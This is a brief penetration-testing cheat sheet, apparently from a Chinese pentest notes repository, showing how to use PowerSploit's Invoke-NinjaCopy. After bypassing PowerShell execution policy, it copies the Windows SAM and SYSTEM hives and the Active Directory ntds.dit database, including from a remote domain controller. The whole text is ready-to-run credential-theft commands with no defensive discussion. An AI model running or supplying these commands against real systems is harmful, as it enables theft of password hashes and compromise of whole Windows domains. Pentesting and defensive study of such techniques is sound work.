	#http://192.168.0.101/powersploit/Exfiltration/Invoke-NinjaCopy.ps1
	>powershell -exec bypass
	>Import-Module .\invoke-ninjacopy.ps1
	>Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive
	>Invoke-NinjaCopy –Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
	>Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "C:\Windows\Temp\1.dit"
	>Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -ComputerName "dc.zone.com" -LocalDestination "C:\Windows\Temp\1.dit"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/316.png)